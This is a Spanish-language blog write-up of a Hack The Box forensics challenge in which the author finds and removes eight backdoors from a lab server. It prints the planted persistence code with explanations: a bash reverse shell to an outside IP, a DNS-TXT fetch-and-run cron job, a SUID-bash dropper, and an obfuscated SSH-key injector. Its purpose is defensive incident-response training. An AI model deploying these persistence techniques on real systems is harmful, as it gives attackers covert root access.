---
layout: single
title: Hack the box Challenge - PersistenceisFutile
excerpt: Reto bastante interesante en el que tenemos que limpíar el sistema de backdoors, logrando esto a través de explorar el sistema. 
date: 2025-07-24
classes: wide
header:
  teaser: ../gits/sec/blog/assets/images/ic-forensics.svg
  teaser_home_page: true
  icon: ../assets/images/hackthebox.webp
categories:
   - hack the box
   - challenge
   - linux
tags:
   - backdoor
---

CHALLENGE DESCRIPTION

Hackers made it onto one of our production servers 😅. We've isolated it from the internet until we can clean the machine up. The IR team reported eight difference backdoors on the server, but didn't say what they were and we can't get in touch with them. We need to get this server back into prod ASAP - we're losing money every second it's down. Please find the eight backdoors (both remote access and privilege escalation) and remove them. Once you're done, run /root/solveme as root to check. You have SSH access and sudo rights to the box with the connections details attached below.


Para esto nos conectamos primeramente por ssh con `ssh user@<IP> -p <PORT>`.
Una vez dentro del laboratorio podemos ejecutar: 

```bash 
user@ng-2122606-forensicspersistence-ikbsi-84dbf79f54-tlw9b:~$ ps -auxf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2616   592 ?        Ss   00:45   0:00 /bin/sh -c /usr/sbin/sshd -D -p 23
root           7  0.0  0.0  12184  7220 ?        S    00:45   0:00 sshd: /usr/sbin/sshd -D -p 23 [listener] 0 of 10-100 startups
root          10  0.0  0.1  13900  8976 ?        Ss   00:46   0:00  \_ sshd: user [priv]
user          24  0.0  0.0  13900  5244 ?        S    00:46   0:00      \_ sshd: user@pts/0
user          25  0.0  0.0   4248  3480 pts/0    Ss   00:46   0:00          \_ -bash
user          37  0.0  0.0   6144  2880 pts/0    R+   00:47   0:00              \_ ps -auxf
root          20  0.0  0.0   3984  2960 ?        S    00:46   0:00 /bin/bash /var/lib/private/connectivity-check
root          23  0.0  0.0   3984   232 ?        S    00:46   0:00  \_ /bin/bash /var/lib/private/connectivity-check
```

Hay un proceso ejecutándose como root en el directorio `/var`, usado normalmente para almacenar logs, tiene un nombre nada común así que procedemos a inspeccionarlo: 

```bash
user@ng-2122606-forensicspersistence-ikbsi-84dbf79f54-tlw9b:~$ sudo cat /var/lib/private/connectivity-check
[sudo] password for user:
#!/bin/bash

while true; do
    nohup bash -i >& /dev/tcp/172.17.0.1/443 0>&1;
    sleep 10;
done
```

Una shell bastate evidente, podemos con nuestros permisos de sudo eliminar este fichero y terminar el proceso con `kill -9 <PID>`: 

Pero parece que falta algo por eliminar, así que podemos buscar ficheros con este nombre:

```bash 
root@ng-2122606-forensicspersistence-sceul-676dc87c7d-jj4nv:/home/user# find / -type f -name "*connectivity-check*" 2>/dev/null
/etc/update-motd.d/30-connectivity-check 
```

**/etc/update-motd.d/** es un directorio que contiene una serie de scripts numerados (00-header, 10-help-text, …, 90-footer). Cada vez que un usuario inicia sesión (por SSH, terminal virtual, etc.) o se ejecuta run-parts /etc/update-motd.d/, todos estos scripts se ejecutan en orden numérico y su salida se concatena para formar el mensaje que ves antes del prompt.

```bash 
t@ng-2122606-forensicspersistence-sceul-676dc87c7d-jj4nv:/home/user# cat /etc/update-motd.d/30-connectivity-check
#!/bin/bash

nohup /var/lib/private/connectivity-check &
```

- nohup … &: lanza el binario /var/lib/private/connectivity-check en segundo plano, desvinculándolo de la terminal (ignora señales de desconexión).
- Ejecución en cada login: porque está en update-motd.d, se invoca cada vez que alguien ingresa al sistema, sin necesidad de privilegios extra ni cron.



------

Ahora podemos ejecutar el siguiente comando: 

```bash 
user@ng-2122606-forensicspersistence-syri7-745757d665-vgl46:~$ ll
total 1184
drwxr-xr-x 1 user user    4096 Jul 16 05:54 ./
drwxr-xr-x 1 root root    4096 May 14  2021 ../
-rwsr-xr-x 1 root root 1183448 May 14  2021 .backdoor*
-rw-r--r-- 1 user user     220 Feb 25  2020 .bash_logout
-rw-rw-r-- 1 root root    3855 Apr 23  2021 .bashrc
drwx------ 2 user user    4096 Jul 16 05:54 .cache/
-rw-r--r-- 1 user user     807 Feb 25  2020 .profile
```

Así que podemos eliminarlo:
```bash
user@ng-2122606-forensicspersistence-syri7-745757d665-vgl46:~$ sudo rm -rf .backdoor
[sudo] password for user:
```

-------

Revisando el `~/.bashrc`: 

![](../assets/images/htb-persistence/2.png)

Eliminamos dicha línea, también revisamos en el directorio de root `sudo vim /root/.bashrc`:

![](../assets/images/htb-persistence/3.png)

Así qué eliminamos esta línea y eliminamos el binario una vez lo encontremos: 

```bash 
user@ng-2122606-forensicspersistence-btivr-7c459d4bf4-rxdtr:~$ which alertd
/usr/bin/alertd
user@ng-2122606-forensicspersistence-btivr-7c459d4bf4-rxdtr:~$ find / -name "alertd" 2>/dev/null
/usr/bin/alertd
user@ng-2122606-forensicspersistence-btivr-7c459d4bf4-rxdtr:~$ sudo rm -rf /usr/bin/alertd
user@ng-2122606-forensicspersistence-btivr-7c459d4bf4-rxdtr:~$
```

Ahora tenemos que revisar si la conexión sigue corriendo: 

```bash 
user@ng-2122606-forensicspersistence-btivr-7c459d4bf4-rxdtr:~$ ps auxf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2616   544 ?        Ss   06:11   0:00 /bin/sh -c /usr/sbin/sshd -D -p 23
root           7  0.0  0.0  12184  5340 ?        S    06:11   0:00 sshd: /usr/sbin/sshd -D -p 23 [listener] 0 of 10-100 startups
root          76  0.0  0.0  13908  6600 ?        Ss   06:22   0:00  \_ sshd: user [priv]
user          89  0.0  0.0  13908  4436 ?        S    06:22   0:00      \_ sshd: user@pts/1
user          90  0.0  0.0   4248  3428 pts/1    Ss   06:22   0:00          \_ -bash
user         188  0.0  0.0   5904  2872 pts/1    R+   07:08   0:00              \_ ps auxf
root          18  0.0  0.0   3984  2804 ?        S    06:11   0:00 /bin/bash /var/lib/private/connectivity-check
root         179  0.0  0.0   3984   236 ?        S    07:07   0:00  \_ /bin/bash /var/lib/private/connectivity-check
root          43  0.0  0.0   2596  1908 ?        S    06:11   0:00 alertd -e /bin/bash -lnp 4444
```

Y matamos el proceso con: 

```bash 
sudo kill -9 43
```

-----------

Ahora podemos revisar ficheros con el bit SUID activado(04000)

```bash 
root@ng-2122606-forensicspersistence-btivr-7c459d4bf4-rxdtr:/home/user# find / -perm -04000 2>/dev/null
/root/solveme
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/dlxcrw
/usr/bin/mgxttm
/usr/bin/sudo
/usr/sbin/afdluk
/usr/sbin/ppppd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Vemos bastantes que son binarios normales en sistemas linux, pero un par si parecen sospechosos, /usr/bin/dlxcrw, /usr/bin/mgxttm, /usr/sbin/afdluk, /usr/sbin/ppppd así que procedemos a eliminarlos.

-----

Ahora revisamos las tareas cron: 

```bash
root@ng-2122606-forensicspersistence-btivr-7c459d4bf4-rxdtr:~# ls -R /etc/cron.*
/etc/cron.d:
anacron  e2scrub_all  popularity-contest

/etc/cron.daily:
0anacron  access-up  apt-compat  bsdmainutils  dpkg  logrotate  man-db  popularity-contest  pyssh

/etc/cron.hourly:

/etc/cron.monthly:
0anacron

/etc/cron.weekly:
0anacron  man-db
```

Encontramos 2 tareas bastantes inusuales, pyssh y access-up, así que revisamos más: 

```bash 
root@ng-2122606-forensicspersistence-btivr-7c459d4bf4-rxdtr:~# cat /etc/cron.daily/access-up
#!/bin/bash


DIRS=("/bin" "/sbin")
DIR=${DIRS[$[ $RANDOM % 2 ]]}

while : ; do
    NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
    [[ -f "{$DIR}/${NEW_UUID}" ]] || break
done

cp /bin/bash ${DIR}/${NEW_UUID}
touch ${DIR}/${NEW_UUID} -r /bin/bash
chmod 4755 ${DIR}/${NEW_UUID}
```

1. **Selección aleatoria de directorio**

   * Define un array `DIRS` con las rutas `"/bin"` y `"/sbin"`.
   * Con `$RANDOM % 2` escoge al azar uno de los dos índices (`0` o `1`) y asigna a `DIR` o bien `/bin` o bien `/sbin`.
   * **Propósito**: variar la ubicación del backdoor para dificultar su detección.

2. **Generación de un nombre aleatorio único**

   * En cada iteración:

     * `cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1`    → genera una cadena aleatoria de 6 letras minúsculas.
     * `[[ -f "{$DIR}/${NEW_UUID}" ]]`                              → comprueba si ya existe un archivo con ese nombre en el directorio elegido.
   * Si existe, vuelve a intentarlo; si no existe, sale del bucle con un nombre único en `NEW_UUID`.
   * **Propósito**: evitar sobrescribir archivos legítimos y cada día crear un binario con un nombre diferente.

3. **Instalación del backdoor SUID**

   * `cp /bin/bash ${DIR}/${NEW_UUID}`
     → copia el intérprete `/bin/bash` a `/bin/<uuid>` o `/sbin/<uuid>`.
   * `touch ${DIR}/${NEW_UUID} -r /bin/bash`
     → ajusta la fecha de modificación del nuevo archivo para que coincida con la de `/bin/bash`, camuflándolo.
   * `chmod 4755 ${DIR}/${NEW_UUID}`
     → establece el bit SUID (`4`) y permisos `755` (propietario lectura/escritura/ejecución, grupo y otros lectura/ejecución).
     → Con bit SUID, cualquier usuario que ejecute este binario obtendrá privilegios de **root**.

**Estos son los binarios que encontramos anteriormente**

El siguiente: 

```bash 
root@ng-2122606-forensicspersistence-btivr-7c459d4bf4-rxdtr:~# cat /etc/cron.daily/pyssh
#!/bin/sh

VER=$(python3 -c 'import ssh_import_id; print(ssh_import_id.VERSION)')
MAJOR=$(echo $VER | cut -d'.' -f1)

if [ $MAJOR -le 6 ]; then
    /lib/python3/dist-packages/ssh_import_id_update
fi
```

- Importar el módulo ssh_import_id (una utilidad standard en Debian/Ubuntu para gestionar claves SSH públicas).
- Imprimir su atributo VERSION (por ejemplo, 5.10.1 o 7.2.0).
- Usa cut para quedarse con el número anterior al primer punto.
    - Si VER="5.10.1", entonces MAJOR="5".
    - Si VER="7.2.0", entonces MAJOR="7".
- Si la versión principal ($MAJOR) es menor o igual a 6, se ejecuta el script malicioso ssh_import_id_update.
- Propósito aparente: aprovechar un “bug” o condición especial en versiones antiguas (≤ 6) de ssh_import_id para camuflar el script, o bien simplemente usar la verificación de versión como excusa para ejecuciones selectivas.

En `/lib/python3/dist-packages/ssh_import_id_update` tenemos: 

```bash
root@ng-2122606-forensicspersistence-btivr-7c459d4bf4-rxdtr:~# cat /lib/python3/dist-packages/ssh_import_id_update
#!/bin/bash

KEY=$(echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgbm9ib2R5QG5vdGhpbmcK" | base64 -d)
PATH=$(echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d)

/bin/grep -q "$KEY" "$PATH" || echo "$KEY" >> "$PATH"
root@ng-2122606-forensicspersistence-btivr-7c459d4bf4-rxdtr:~# echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgbm9ib2R5QG5vdGhpbmcK" | base64 -d
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRdx5Rq5+Obq66cywz5KW9ofVm0NCZ39EPDA2CJDqx1 nobody@nothing
root@ng-2122606-forensicspersistence-btivr-7c459d4bf4-rxdtr:~# echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d
/root/.ssh/authorized_keys
```

Así que eliminamos este fichero `/lib/python3/dist-packages/ssh_import_id_update`

También necesitamos remover la clave ssh de `/root/.ssh/authorized_keys`

Y eliminaos las líneas del crontab: 

```bash
user@ng-2122606-forensicspersistence-x9jux-85d7798569-nztlw:~$ crontab -l
* * * * * /bin/sh -c "sh -c $(dig imf0rce.htb TXT +short @ns.imf0rce.htb)"
```

Entramos con `crontab -l` y elimminamos las líneas. 

-------

Bien, ahora podemos revisar los usuarios: 

```bash 
root@ng-2122606-forensicspersistence-sceul-676dc87c7d-jj4nv:/home/user# cat /etc/passwd | grep -i "/bash"
root:x:0:0:root:/root:/bin/bash
gnats:x:41:0:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/bash
user:x:1000:1000::/home/user:/bin/bash
root@ng-2122606-forensicspersistence-sceul-676dc87c7d-jj4nv:/home/user# groups gnats
gnats : root
```

El usuario gnats en Linux es un usuario especial que se utiliza para el sistema de seguimiento de problemas (bug tracking system) de GNU.
Este usuario gnats se utiliza para recibir y procesar informes de problemas (bugs) enviados a los sistemas de seguimiento de problemas de GNU.

Así que le quitamos permisos de bash y le asignamos el grupo de gnats unicamente: 

```bash 
usermod -s /usr/sbin/nologin gnats
usermod -g gnats gnats
```

También podemos eliminar el hash de gnats en `/etc/shadow`:

```bash 
root@ng-2122606-forensicspersistence-sceul-676dc87c7d-jj4nv:/home/user# cat /etc/shadow
root:*:18733:0:99999:7:::
daemon:*:18733:0:99999:7:::
bin:*:18733:0:99999:7:::
sys:*:18733:0:99999:7:::
sync:*:18733:0:99999:7:::
games:*:18733:0:99999:7:::
man:*:18733:0:99999:7:::
lp:*:18733:0:99999:7:::
mail:*:18733:0:99999:7:::
news:*:18733:0:99999:7:::
uucp:*:18733:0:99999:7:::
proxy:*:18733:0:99999:7:::
www-data:*:18733:0:99999:7:::
backup:*:18733:0:99999:7:::
list:*:18733:0:99999:7:::
irc:*:18733:0:99999:7:::
gnats:$6$SLVgdKJw4kQ5L0bv$ODjJstI50dhKq/IPbmLiZyJpcIPkifIUJGsQ.4f9EguBzf5JeI4sswDo9DsGZ39CDHP8h5AnnSNW5wgi7GeLZ.:18761:0:99999:7:::
nobody:*:18733:0:99999:7:::
_apt:*:18733:0:99999:7:::
systemd-timesync:*:18761:0:99999:7:::
systemd-network:*:18761:0:99999:7:::
systemd-resolve:*:18761:0:99999:7:::
messagebus:*:18761:0:99999:7:::
dnsmasq:*:18761:0:99999:7:::
sshd:*:18761:0:99999:7:::
user:$6$O..haIB2NMyT0/XH$vx5dw9pPri/gxrakXu0cQwaRp3e2mb70SpBHVDV32LPeUvh0Hy1NRSoJxAGoJ4ZeCbuZL9.7dWueWSoJ7MbTH0:18761:0:99999:7:::
```

--- 

Con esto ya tendríamos las tareas completadas: 

```bash 
root@ng-2122606-forensicspersistence-x9jux-85d7798569-nztlw:/home/user# /root/solveme
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is fully remediated
Issue 4 is fully remediated
Issue 5 is fully remediated
Issue 6 is fully remediated
Issue 7 is fully remediated
Issue 8 is fully remediated

Congrats: HTB{7tr3@t_hUntIng_4TW}
```


